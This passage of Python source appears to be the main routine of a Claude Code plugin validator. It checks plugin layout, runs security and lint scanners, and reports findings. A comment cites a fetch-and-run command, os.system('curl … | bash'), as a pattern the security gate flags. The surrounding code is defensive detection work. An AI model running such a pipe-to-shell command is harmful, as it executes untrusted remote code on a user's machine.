    ).is_file()
    has_plugin_manifest = (plugin_root / ".claude-plugin" / "plugin.json").is_file()
    if has_marketplace and not has_plugin_manifest and not args.marketplace_only:
        print(
            f"Error: {plugin_root} is a MARKETPLACE folder (has marketplace.json), not a plugin.\n"
            f"  Use validate_marketplace.py to validate marketplaces, or pass a plugin\n"
            f"  subfolder to validate_plugin.py.",
            file=sys.stderr,
        )
        return 1

    # Phase 0 plugin-shape detection — refuse to "validate as plugin" something
    # that clearly isn't a plugin. Real incident: CPV agents wrapped a SKILL
    # (which has SKILL.md at root + a `references/` folder + relative-path
    # references) into a plugin manifest + marketplace + publish pipeline,
    # and the published artifact installed to nothing because the underlying
    # content was a skill, not a plugin. This guard fails fast with a clear
    # message telling the user to call the right validator OR convert the
    # content to a plugin first.
    if not has_plugin_manifest and not has_marketplace and not args.marketplace_only:
        skill_md_at_root = (plugin_root / "SKILL.md").is_file()
        agents_only = (
            (plugin_root / "agents").is_dir()
            and not (plugin_root / "skills").is_dir()
            and not (plugin_root / "commands").is_dir()
            and not (plugin_root / "hooks").is_dir()
        )
        commands_only = (
            (plugin_root / "commands").is_dir()
            and not (plugin_root / "skills").is_dir()
            and not (plugin_root / "agents").is_dir()
            and not (plugin_root / "hooks").is_dir()
        )
        if skill_md_at_root:
            print(
                f"Error: {plugin_root} contains SKILL.md at root — it is a SKILL, not a plugin.\n"
                f"  This is the most common mis-classification that produces empty plugin\n"
                f"  installs. Either:\n"
                f"  (a) wrap this skill INTO a new plugin: place its content under\n"
                f"      <new-plugin>/skills/<skill-name>/SKILL.md, then add\n"
                f"      <new-plugin>/.claude-plugin/plugin.json;\n"
                f"  (b) ADD this skill to an existing plugin's skills/ folder;\n"
                f"  (c) validate as a skill: `cpv-remote-validate skill {plugin_root}`.",
                file=sys.stderr,
            )
            return 1
        if agents_only:
            print(
                f"Error: {plugin_root} only has agents/ — it is a single agent, not a plugin.\n"
                f"  Wrap into a plugin (add .claude-plugin/plugin.json + at least one\n"
                f"  component) or add the agent to an existing plugin's agents/ folder.",
                file=sys.stderr,
            )
            return 1
        if commands_only:
            print(
                f"Error: {plugin_root} only has commands/ — it is a loose commands folder,\n"
                f"  not a plugin. Wrap into a plugin or add to an existing plugin's commands/.",
                file=sys.stderr,
            )
            return 1
        # Generic missing-manifest case (no recognised standalone shape):
        print(
            f"Error: {plugin_root} has no .claude-plugin/plugin.json and no recognised\n"
            f"  standalone Claude Code shape (no SKILL.md, no agents/, no commands/).\n"
            f"  CPV refuses to validate this as a plugin — wrapping arbitrary directories\n"
            f"  into plugin manifests has historically produced empty installs.\n"
            f"  Add .claude-plugin/plugin.json (and at least one component dir) or pass\n"
            f"  a different path.",
            file=sys.stderr,
        )
        return 1

    # Initialize gitignore filter — all scan functions use this to skip ignored files
    global _gi  # noqa: PLW0603
    _gi = GitignoreFilter(plugin_root)

    # Run validation
    report = ValidationReport()
    marketplace_only = args.marketplace_only
    skip_platform_checks = args.skip_platform_checks

    # TRDD-20108ab7 (2026-05-10): resolve --marketplace-context (if any) so
    # validate_manifest sees the explicit hosting marketplace and skips
    # auto-discovery. Malformed/missing marketplace.json at the override path
    # falls through to auto-discovery rather than crashing.
    explicit_hosting: dict[str, Any] | None = None
    if args.marketplace_context:
        ctx_path = Path(args.marketplace_context).resolve()
        if ctx_path.is_dir():
            # Try Layout C location first, then bare marketplace.json at root.
            for cand in (
                ctx_path / ".claude-plugin" / "marketplace.json",
                ctx_path / "marketplace.json",
            ):
                explicit_hosting = _safe_load_marketplace_json(cand)
                if explicit_hosting is not None:
                    break
        else:
            explicit_hosting = _safe_load_marketplace_json(ctx_path)
        if explicit_hosting is None:
            print(
                f"Warning: --marketplace-context {args.marketplace_context!r} "
                "did not resolve to a readable marketplace.json — auto-discovery "
                "will be used instead.",
                file=sys.stderr,
            )

    # ---------------------------------------------------------------------
    # Phase 1 (SERIAL) — manifest + structural + skillaudit must run first.
    # ---------------------------------------------------------------------
    #
    # validate_manifest sets the manifest fingerprint other validators
    # implicitly trust (they re-read plugin.json but expect it to exist
    # with the parsed-without-error shape this call enforces).
    #
    # validate_structure / validate_layout_c_consistency must finish before
    # the parallel batch so the umbrella report has its "shape correct"
    # findings emitted first — matches the long-standing serial output
    # order that humans + CI consumers parse.
    #
    # _run_skillaudit_native must be serial because it mutates a
    # module-level flag inside validate_security (_set_cpv_self_scan
    # writes _CPV_SELF_PLUGIN_ROOT / _CPV_SELF_SCAN_ACTIVE / the hash
    # manifest dict). Validators that READ that state in the parallel
    # batch (validate_canonical_pipeline_drift, validate_legacy_pipeline_scripts)
    # need it set BEFORE the batch starts to avoid racing a partially-built
    # manifest dict. Running skillaudit here guarantees the writes are
    # complete before any concurrent reader fires.
    validate_manifest(plugin_root, report, marketplace_only, hosting_marketplace=explicit_hosting)
    validate_structure(plugin_root, report, marketplace_only)
    # gitignore-evasion hardening — a git-tracked file that ALSO matches
    # .gitignore ships but is marked ignored (a scan-evasion vector); flag the
    # plugin INVALID and route the user to the fix agent to untrack them.
    check_tracked_gitignored_files(plugin_root, report)
    # v2.32.0 — Layout C cross-validation (marketplace-in-plugin)
    validate_layout_c_consistency(plugin_root, report)
    # v2.99.1 — skillaudit native (50 rules / 489 patterns) — MANDATORY,
    # NOT skippable. Wires the in-process scanner into the standard plugin
    # validation pipeline so every `validate_plugin.py <path>` run gets the
    # full skillaudit threat catalog (credential theft, exfiltration,
    # prompt injection, MCP schema poisoning, A2A attacks, obfuscation,
    # supply chain, container escape, persistence, crypto theft, etc.)
    # in addition to validate_security.py Check 27. Iron rule preserved:
    # missing rule catalog → CRITICAL via cpv_skillaudit_native.report_findings.
    _run_skillaudit_native(plugin_root, report)
    # RT4-plugin-gate-weaker-than-security — make the user-facing plugin gate at
    # least as strong as the `security` subcommand for the EXECUTION class.
    # Without this, a plain os.system("curl … | bash") passed the plugin gate
    # VALID/exit-0 while firing CRITICAL (RC-136) via `security`. This runs the
    # in-process RCE/exec scanners (injection, supply-chain, RC-70 obfuscated
    # decode-then-exec, RC-73/74/75 taint) and merges back ONLY execution-class
    # findings — no external scanners, no secret/path findings, no suppression.
    # Serial here (same rationale as skillaudit above): it arms/disarms the
    # validate_security self-scan module-flag, so it must complete BEFORE the
    # parallel batch's readers fire.
    _run_security_execclass_gate(plugin_root, report)
    # Print the repo-lint banner up front so output ordering is stable
    # whether or not the rest of the validators run in parallel. The lint
    # engine itself runs INSIDE the parallel batch below.
    #
    # In --json mode this banner (and the lint engine's own preamble lines)
    # MUST NOT touch stdout: the --json contract is stdout = the JSON object
    # ONLY, so a JSON consumer (e.g. cpv_pre_install_scan) can json.loads()
    # the whole stdout buffer. Route the human-readable banner to stderr;
    # the lint engine's preamble is suppressed via quiet=args.json below.
    print(
        f"\n{COLORS['BOLD']}═══ [REPO LINT] (15 languages, gitignore-filtered) ═══{COLORS['RESET']}",
        file=sys.stderr if args.json else sys.stdout,
    )

    # ---------------------------------------------------------------------
    # Phase 2 — independent per-plugin validators run in PARALLEL.
    # ---------------------------------------------------------------------
    #
    # Each task: (display_name, callable, ((pos_args), {kw_args})). The
    # callable receives ``(plugin_root, sub_report, *pos_args, **kw_args)``
    # where ``sub_report`` is a fresh ValidationReport. After all tasks
    # complete, sub_reports are merged into the umbrella ``report`` IN
    # THIS LIST ORDER so the final result sequence matches the serial
    # baseline that this orchestrator replaces.
    #
    # Validators included here all match the (plugin_root, report, *args)
    # signature, have NO inter-dependency on each other's report content,
    # and either don't touch shared module-level state at all OR only
    # READ state that Phase 1 (skillaudit) already wrote.
    #
    # NOT included here (kept serial in Phase 3):
    #   * validate_project_languages — returns dict consumed by
    #     validate_lockfiles, so they must chain serially.
    #   * validate_lockfiles — depends on above.
    #   * _check_stale_user_settings_local — touches ~/.claude/ (user-scope
    #     mutation hazard if parallelized with concurrent CPV runs).
    #   * _run_cache_audit_separate — writes its own report file, must
    #     happen last for the pointer to land in the right place.
    parallel_tasks: list[tuple[str, Any, tuple[tuple, dict]]] = [
        ("validate_commands", validate_commands, ((), {})),
        ("validate_agents", validate_agents, ((), {})),
        ("validate_hooks", validate_hooks, ((), {})),
        ("validate_hook_precedence_all", validate_hook_precedence_all, ((), {})),
        ("validate_mcp", validate_mcp, ((), {})),
        ("validate_lsp", validate_lsp, ((), {})),
        ("validate_encoding", validate_encoding, ((), {})),
        # TRDD-e3e74f69 telemetry hookup — OTEL supply-chain audit on every plugin
        ("validate_telemetry", validate_telemetry, ((), {})),
        ("validate_scripts", validate_scripts, ((), {})),
        # v2.64.0 — single source of truth for repo-wide linting (most expensive).
        # Replaces the inline lint pieces of validate_scripts (Python ruff/mypy,
        # shell shellcheck, JS eslint, PowerShell PSSA, Go vet, Rust cargo) AND
        # the standalone scripts/lint_files.py orchestrator. Strict-by-default:
        # any missing linter for a detected language fails the run with MAJOR.
        ("run_lint_engine", run_lint_engine, ((), {"strict_missing_tools": True, "quiet": args.json})),
        ("validate_bin_executables", validate_bin_executables, ((), {})),
        ("validate_skills", validate_skills, ((skip_platform_checks,), {})),
        # TRDD-25b9be90 — cross-reference validation, including ghost-agent dispatch
        # detection (RC-GHOST-DISPATCH-001 CRITICAL when Task() / subagent_type
        # literals reference agents that don't exist).
        ("_run_xref_in_pipeline", _run_xref_in_pipeline, ((), {})),
        ("validate_rules", validate_rules, ((), {})),
        ("validate_output_styles", validate_output_styles, ((), {})),
        ("validate_readme", validate_readme, ((), {})),
        ("validate_license", validate_license, ((), {})),
        ("validate_no_local_paths", validate_no_local_paths, ((), {})),
        ("validate_gitignore", validate_gitignore, ((), {})),
        ("validate_strip_gitmodules", validate_strip_gitmodules, ((), {})),
        ("validate_cross_platform", validate_cross_platform, ((), {})),
        ("validate_md_content_references", validate_md_content_references, ((), {})),
        ("validate_workflow_inline_python", validate_workflow_inline_python, ((), {})),
        # TRDD-35BN0TEI: BLOCK a stale/non-resolvable CPV git ref (`@main` etc.)
        # pinned in a workflow — enforced HERE (the publish gate) so publish.py
        # Gate 3 refuses to ship a pipeline that 404s on the runner.
        ("validate_workflow_cpv_ref", validate_workflow_cpv_ref, ((), {})),
        ("validate_pipeline_readiness", validate_pipeline_readiness, ((), {})),
        ("validate_pipeline_script_refs", validate_pipeline_script_refs, ((), {})),
        ("validate_workflow_path_broken", validate_workflow_path_broken, ((), {})),
        # #115 part-5 — NON-BLOCKING advisory: a binary build/stage reachable
        # only from tag/release with no push/PR smoke job. WARNING-level (never
        # changes the verdict / blocks --strict). The standard canonical
        # release.yml produces ZERO findings (no compiled-artifact build/stage).
        ("check_untested_until_release", check_untested_until_release, ((), {})),
        # issue #155 — NON-BLOCKING advisory: shipped components (scripts/hooks/
        # skills/commands/agents) with no discoverable test, in a plugin that
        # DOES ship a test suite. WARNING-level (never changes the verdict /
        # blocks --strict). Universal: generic conventions, zero marketplace /
        # ai-maestro assumptions.
        ("check_test_coverage", check_test_coverage, ((), {})),
        ("validate_canonical_pipeline_drift", validate_canonical_pipeline_drift, ((), {})),
        ("validate_legacy_pipeline_scripts", validate_legacy_pipeline_scripts, ((), {})),
        ("validate_pep723_invocations", validate_pep723_invocations, ((), {})),
        ("validate_workflow_best_practices", validate_workflow_best_practices, ((), {})),
        # Submodule containment is per-plugin; doesn't feed lockfiles.
        ("validate_submodule_containment", validate_submodule_containment, ((), {})),
    ]

    if _orchestrator_parallel_enabled():
        # Parallel path — dispatch all tasks to the thread pool and merge
        # results in input order so the umbrella report's result sequence
        # is identical to the serial baseline.
        _run_parallel_batch(parallel_tasks, plugin_root, report)
    else:
        # Serial path — bit-identical fallback. Used by the parity
        # regression test AND by CPV_ORCHESTRATOR_PARALLEL=0 when a
        # caller suspects the parallel path of a regression.
        for name, fn, (pos_args, kw_args) in parallel_tasks:
            try:
                fn(plugin_root, report, *pos_args, **kw_args)
            except Exception as exc:  # noqa: BLE001 — match parallel error-capture
                # MAJOR, not MINOR: a crashed validator is indeterminate and its
                # (possibly CRITICAL) findings are lost — keep the verdict
                # blocking. Mirrors the parallel path above.
                report.major(f"Validator '{name}' crashed: {type(exc).__name__}: {exc}")

    # ---------------------------------------------------------------------
    # Phase 3 (SERIAL) — settings/language detection/lockfiles + epilogue.
    # ---------------------------------------------------------------------
    # Check for stale ~/.claude/settings.local.json — should not exist at user level
    _check_stale_user_settings_local(report)
    # Plugin-wide unauthorized-install combo (specific marketplace-add + specific plugin-install)
    _check_unauthorized_install_combo(plugin_root, report)
    # Language detection feeds lockfile detection — must remain serial.
    detected_languages = validate_project_languages(plugin_root, report)
    validate_lockfiles(plugin_root, report, detected_languages)

    # Prompt-cache audit (CA-01..CA-06, all WARNING) — CALLED, not integrated.
    # Writes its OWN report and contributes only a one-line pointer to the main
    # report; cache findings never affect the VALID/INVALID verdict. The
    # standalone `cpv-cache-optimize` audit/fix commands act on these findings.
    cache_pointer = _run_cache_audit_separate(plugin_root, args.report, report)

    # Output
    if args.json:
        print_json(report)
    else:
        if args.report:
            save_report_and_print_summary(
                report,
                Path(args.report),
                "Plugin Validation",
                print_results,
                args.verbose,
                args.strict,
                plugin_path=args.path,
                # RT4-plugin-gate-weaker-than-security — render the Gate-A
                # execution-class banner on the compact-summary stdout too, so
                # the user sees it without opening the report file. The banner
                # is purely additive (never changes the verdict/exit code).
                security_gates=True,
            )
        else:
            print_results(report, args.verbose, args.strict)
        # Always surface the cache-audit pointer on stdout (it is INFO-level in
        # the report, which non-verbose summaries hide) so the user sees where
        # the separate cache report landed regardless of verbosity.
        if cache_pointer:
            print(cache_pointer)

    if args.strict:
        return report.exit_code_strict()
    return report.exit_code


if __name__ == "__main__":
    sys.exit(main())
